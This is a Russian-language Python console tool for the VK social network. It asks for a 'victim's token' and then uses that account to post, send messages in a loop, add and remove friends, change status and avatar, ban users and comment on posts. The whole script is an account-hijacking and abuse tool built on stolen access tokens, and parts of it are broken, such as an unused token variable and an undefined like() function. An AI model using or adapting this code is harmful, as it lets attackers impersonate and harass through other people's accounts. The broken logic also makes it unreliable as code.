#subprocess.call("notepad.exe")
from prettytable import PrettyTable  
from progress.bar import IncrementalBar                                     
import time
import sys                                                                     
import os
from os import system, name
import random as r
import subprocess 
import datetime                                                                 
import random
bar = IncrementalBar('Подгрузка модулей...', max = 100)
import urllib
from urllib import request
import requests
import json
import vk_api
import vk
import typer
from typer import Option, Typer, Argument
import pytz
import numpy as np
for i in range(100):
    bar.next()
    time.sleep(0.02)
bar.finish()

def get_time():
    return datetime.datetime.strftime(datetime.datetime.now(pytz.timezone('Europe/Moscow')), "%d.%m.%Y %H:%M:%S")
def console_log(text, symbols_amount=30):
    print("[" + get_time() + "] " + text)
    print("-" * symbols_amount)
def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')
def print_red(text):
    print("\033[31m {}" .format(text))
def print_yellow(text):
    print("\033[33m {}" .format(text))
def print_blue(text):
    print("\033[34m {}" .format(text))

token = 'null'
def functions():
    def post():
        vk = vk_api.VkApi(token=token)
        clear()
        info = input('Введите новый текст поста >>> ')
        try:
            vk.method("wall.post", {"message": info})
        except vk.exceptions.VkAPIError:
            print('Err')
            return
        console_log('Пост добавлен успешно!')
        menu()

    def friend_add():
        vk = vk_api.VkApi(token=token)
        clear()
        info = input('Введите айди юзера >>> ')
        try:
            vk.method("friends.add", {"user_id": info})
        except vk.exceptions.VkAPIError:
            print('Err')
            return
        console_log('Заявка отправлена успешно')
        menu()

    def friend_remove():
        vk = vk_api.VkApi(token=token)
        clear()
        info = input('Введите айди юзера >>> ')
        try:
            vk.method("friends.delete", {"user_id": info})
        except vk.exceptions.VkAPIError:
            print('Err')
            return
        console_log('Друг удален успешно')
        menu()

    def msg_send():
        clear()
        vk = vk_api.VkApi(token=token)
        info = input('Введите айди юзера или чата :')
        while True:
            msg = input('Введите сообщение юзеру :')
            # attachment = "photo245029801_457250229"
            vk.method("messages.send", {"peer_id": info, "message": msg, "random_id": random.randint(1, 2147483647)})
            console_log('Сообщение отправлено успешно')
        menu()

    def vertyeplyshka():
        clear()
        vk = vk_api.VkApi(token=token)
        info = input('Введите айди юзера или чата :')
        attachment = "photo245029801_457250229"
        vk.method("messages.send", {"peer_id": info, "random_id": random.randint(1, 2147483647), "attachment": attachment})
        console_log('Сообщение отправлено успешно')
        menu()
# 2000000009
    def status_change():
        clear()
        vk = vk_api.VkApi(token=token)
        console_log('Идет смена статуса...') 
        info = input('Введите новый статус :')
        vk.method("status.set", {"text": info})
        console_log('Статус сменен успешно!')
        menu()

    def ava_change():
        clear()
        vk = vk_api.VkApi(token=token) 
        console_log('Идет смена аватарки...') 
        upload = vk_api.VkUpload(vk)
        photo = upload.photo_profile('213.jpg')
        console_log('Аватар сменен успешно!')        
        menu()

    def unban():
        clear()
        user_id = input('Введите цифровой id пользователя, которого вы хотите убрать из чс $')
        vk_session = vk_api.VkApi(token=token)
        api = vk_session.get_api()
        console_log('Сессия получена успешно!')
        try:
            while True:
                get = api.friends.getRequests(out=1, count=1)
                check = get['count']
                if check == 0:
                    pass
                else:
                    id = get['items']
                    api.account.unbanUser(user_id=user_id)
                    console_log('specktor.json разбанил {user_id}')
                    time.sleep(1)
                    menu()
        except Exception as error:
            print(error)         

    def ban():
        clear()
        user_id = input('Введите цифровой id пользователя, которого вы хотите добавить в чс >>> ')
        vk_session = vk_api.VkApi(token=token)
        api = vk_session.get_api()
        console_log('Сессия получена успешно!')
        try:
            while True:
                get = api.friends.getRequests(out=1, count=1)
                check = get['count']
                if check == 0:
                    pass
                else:
                    id = get['items']
                    api.account.banUser(user_id=user_id)
                    console_log('specktor.json забанил {user_id}')
                    time.sleep(1)
                    menu()
        except Exception as error:
            print(error)

    def comm():
        session = vk.Session(access_token=token)
        api = vk.API(session)
        clear()
        post_comment = input('ID пользователя >>> ')
        postid = input('ID записи >>> ')
        mess = input('Текст комментария >>> ')
        try:
            api.wall.createComment(owner_id=post_comment,post_id=postid,message=mess)
        except vk.exceptions.VkAPIError:
            print('У этого пользователя для вас закрыты комментарии.\n')
            return
        print('Комментарий отправлен!\n\n')
        menu()
    
    token = input("[" + get_time() + "] " + 'Введите токен жертвы >>>')    
    x  = int(input("Выберите функцию >>>"))
    
    if x == 1: post()
    elif x == 2: friend_add()
    elif x == 3: friend_remove()
    elif x == 4: msg_send()
    elif x == 5: status_change()
    elif x == 6: ava_change()
    elif x == 7: unban()
    elif x == 8: ban()
    elif x == 9: vertyeplyshka()
    elif x == 10: comm()
    elif x == 11: like()
    else: 
        print("[" + get_time() + "] " + 'Некорректный ввод')
        menu()          

def menu():
    clear()
    print_yellow('''                ____    _        ''')
    print_yellow('''   ____  __  __/ / /   (_)________  ____ ''')
    print_yellow('''  / __ \/ / / / / /   / / ___/ __ \/ __ \ ''')
    print_yellow(''' / / / / /_/ / / /   / (__  ) /_/ / / / /''')
    print_yellow('''/_/ /_/\__,_/_/_(_)_/ /____/\____/_/ /_/ ''')
    print_yellow("                 /___/  ")
    print_yellow(" ")
    print_yellow(" ")
    print_yellow('Выберите функцию')    
    print_blue('1.Добавить пост')
    print_blue('2.Добавить в друзья')
    print_blue('3.Убрать из друзей')
    print_blue('4.Отправить сообщение')
    print_blue('5.Сменить статус')
    print_blue('6.Сменить аватарку')
    print_blue('7.Убрать из чс')
    print_blue('8.Добавить в чс')
    print_blue('9.Отправить вертеплюшку')
    print_blue("10.Комментировать запись")
    print_blue("11.Лайкнуть запись")
    def tablo():    
        fi = ['№','Имя, Фамилия','Ид страницы','Токен']    
        tbl = PrettyTable(fi)
        
        print(tbl)
    tablo()
    
    functions()
menu()

